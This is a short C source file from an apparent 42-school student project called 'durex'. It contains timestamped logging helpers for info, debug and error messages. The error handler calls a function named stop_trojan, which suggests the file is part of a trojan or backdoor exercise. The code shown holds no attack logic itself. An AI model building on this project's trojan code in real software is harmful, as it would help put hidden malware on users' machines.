/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   log.c                                              :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mdufaud <mdufaud@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/05/17 18:08:58 by mdufaud           #+#    #+#             */
/*   Updated: 2018/05/20 21:08:33 by mdufaud          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"
#include <time.h>
#include <signal.h>
#include <sys/file.h>

void		durex_log(t_durex *durex, char *s, char *type)
{
	time_t		timer;
	char		buffer[50 + 1];
	struct tm	*tm_info;

	if (durex->log >= 0)
	{
		time(&timer);
		tm_info = localtime(&timer);
		strftime(buffer, 50, "[%H:%M:%S]", tm_info);
		ft_fprintf(durex->log, "%s - %s - %s", buffer, type, s);
	}
}

void		log_info(t_durex *durex, char *s)
{
	durex_log(durex, s, "INFO");
}

void		log_debug(t_durex *durex, char *s)
{
	durex_log(durex, s, "DEBUG");
}

void		log_error(t_durex *durex, char *s)
{
	durex_log(durex, s, "ERROR");
	stop_trojan(durex);
	exit(1);
}
